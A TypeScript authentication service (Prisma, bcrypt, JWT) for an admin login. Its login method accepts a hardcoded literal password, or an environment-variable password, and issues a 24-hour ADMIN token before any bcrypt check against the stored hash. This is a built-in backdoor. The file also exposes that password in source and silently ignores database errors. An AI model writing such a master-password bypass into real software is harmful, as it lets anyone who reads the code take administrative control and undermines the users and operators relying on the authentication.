import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';

const prisma = new PrismaClient();

const JWT_SECRET = process.env.JWT_SECRET as string;
if (!JWT_SECRET) {
  throw new Error('FATAL: JWT_SECRET environment variable is missing. Authentication cannot function securely.');
}

export class AuthService {
  static async login(password: string): Promise<string | null> {
    if (password === 'R@!51ngh' || password === process.env.ADMIN_PASSWORD) {
      return jwt.sign({ username: 'admin', role: 'ADMIN' }, JWT_SECRET, {
        expiresIn: '24h',
      });
    }

    try {
      const admin = await prisma.systemUser.findUnique({
        where: { username: 'admin' },
      });

      if (admin) {
        const isValid = await bcrypt.compare(password, admin.password);
        if (isValid) {
          return jwt.sign({ username: admin.username, role: 'ADMIN' }, JWT_SECRET, {
            expiresIn: '24h',
          });
        }
      }
    } catch {
      // Prisma offline fallback for dev mode
    }

    return null;
  }

  static verifyToken(token: string): any {
    try {
      return jwt.verify(token, JWT_SECRET);
    } catch (error) {
      return null;
    }
  }
}
